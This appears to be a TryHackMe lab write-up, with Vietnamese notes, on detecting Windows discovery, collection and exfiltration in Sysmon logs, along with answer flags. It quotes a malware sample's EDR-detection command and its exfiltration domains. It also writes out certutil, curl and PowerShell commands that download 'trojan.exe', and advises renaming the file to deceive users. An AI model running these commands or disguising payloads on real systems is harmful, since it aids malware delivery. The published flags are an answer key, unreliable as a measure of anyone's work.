# Windows Threat Detection 2

# Discovery overview 

1 Open CMD and type "net user Administrator".

Which privileged group does the user belong to?

→ Correct answer: Administrators

<img width="948" height="537" alt="image1" src="https://github.com/user-attachments/assets/1d4bfa01-6729-45cc-9e11-47d1478f49eb" />

2 Open Event Viewer and try to find your command in Sysmon logs.

What is the "Image" field of the net command you just run?

→Correct answer: C:\Windows\System32\net.exe

Để xem được thì chúng ta mở event viewer và  vào phần appications and services logs → microsoft → windows -> sysmon → operational . Sau đó filter theo event id = 1 và tìm nơi command line của chúng ta nhập trên cmd là được. 

<img width="1563" height="955" alt="image8" src="https://github.com/user-attachments/assets/642dfde7-0f51-4194-8b96-677b97e8b7aa" />
 
# Detecting Discovery 

1 Looking at Sysmon logs, what is the first command the invoice.pdf.exe executes?

→Correct answer: whoami

Sau khi chạy invoice.pdf.exe thì máy tính đã chạy lệnh whoami đầu tiên

<img width="1177" height="850" alt="image3" src="https://github.com/user-attachments/assets/3241ebab-dfbe-48fc-bc94-7af2f6bbc347" />

2 Which command did the malware use to check the presence of MS Defender EDR?

→Correct answer: cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"

<img width="1183" height="838" alt="image4" src="https://github.com/user-attachments/assets/c2247ed8-e02f-4819-ad37-d16c709dca38" />

3 To which domain did the malware send the discovered data?

→Correct answer: exfil.beecz.cafe

Sau khi khai thác xong mã độc gửi data tới tên miền sau. 

<img width="1192" height="803" alt="d" src="https://github.com/user-attachments/assets/5ed7ab3d-831d-4f9f-a9b2-e2ad57dbc3a9" />

# Collection overview 

1 What is the Facebook password that the user saved in Chrome?

(Chrome menu > Passwords and autofill > Password Manager)

→Correct answer: nsAghv51BBav90! 

Mở google ra và kiểm tra password nhập password admin là lab cấp. chúng ta sẽ tìm ra password 

<img width="1057" height="565" alt="image13" src="https://github.com/user-attachments/assets/8d95e3e4-4a26-43d1-9cc6-0613b8c6677c" />

2 Which interesting SSH key does the user store on disk?

(Start your search from C:\Users\Administrator\)

→Correct answer: thm-access-database.key    

<img width="1152" height="671" alt="image14" src="https://github.com/user-attachments/assets/411756a4-abdc-4ab1-8230-9a7734f297be" />

3 What is the secret PDF file explaining TryHackMe's internal network?

(Look for the file on the Desktop, Downloads, and Documents)

→Correct answer:thm-network-diagram-2025.pdf 

<img width="1425" height="508" alt="image6" src="https://github.com/user-attachments/assets/1f262508-2ac5-49e0-821f-8f8457d54934" />

# Detecting  collection 

1 Looking at Sysmon logs, what directory does the stealer create?

→Correct answer: staging_58f1

Trong event view kiểm tra chúng ta có  thể thấy ngay sau khi mà chạy file exe thì nó liền mkdir tạo ra thư mục  là staging_58f1

<img width="1172" height="587" alt="image11" src="https://github.com/user-attachments/assets/709bf50a-e7da-4239-8011-e01b149071f8" />

2 Which three file extensions does the malware search for?

Format: Separate by comma in alphabetic order (e.g. bat, txt)

→Correct answer: docx, pdf, xlsx

Kiểm tra từng tập tin sẽ thấy rõ. 

3 Which PowerShell cmdlet does the malware use to get clipboard content?

→Correct answer: Get-ClipBoard

<img width="1190" height="832" alt="image10" src="https://github.com/user-attachments/assets/b28f5e56-f72e-450e-8a68-3172ecfffe9f" />

4 Which domain does the malware exfiltrate the data to?

→Correct answer: collecteddata-storage-2025.s3.amazonaws.com

ngay sau khi khai thác xong nó gửi data tới tên miền nào để xem được chúng ta clear filter và kiểm event id ngay sau khi chúng làm xong tất cả mọi việc để coi.

<img width="1180" height="842" alt="image12" src="https://github.com/user-attachments/assets/50ded2fc-4787-42f7-b05b-ded1efeaf0d6" />

# ingress tool transfer

1 Open the Chrome browser on the VM and navigate to the URL.

What is the flag in the response?

→Correct answer: THM{just_use_web_browser} 

Chỉ cần copy url mở trong google máy ảo sẽ auto hiện flag 

2 Next, open CMD and download the file from the same URL using curl.exe.

What is the flag in the response?

→Correct answer:  THM{curl_is_cool}

Sau khi curl.exe đường link về có thể lưu dưới  tên khác như window.exe or good.exe để đánh lừa người dùng , sau đó chúng ta type or cat nếu dùng linux file này ra sẽ thấy flag

<img width="1202" height="442" alt="image2" src="https://github.com/user-attachments/assets/380920e7-0ad2-4f58-80d2-02fff834aabb" />


3 Continue with the same CMD and URL, but now using certutil.exe.

What is the flag in the response?

→Correct answer: THM{abusing_certutil}

Lệnh này như curl nhưng -f là ghi đè lên, còn -urlcache là tham số ra lệnh cho url tải. 

<img width="1192" height="442" alt="image7" src="https://github.com/user-attachments/assets/9b87b72b-594d-4254-99c6-0b1f6e24d0e7" />

4 Finally, download the same file using PowerShell IWR.

What is the flag in the response?

→Correct answer: THM{power_of_powershell} 

dùng lệnh ‘’’  powershell -c "Invoke-WebRequest -Uri 'http://appsforfree.thm/trojan.exe' -OutFile 'fuck.exe'  ‘’’ 

<img width="1228" height="736" alt="image5" src="https://github.com/user-attachments/assets/8e764e79-3f0a-4270-a115-968a7dcd5504" />

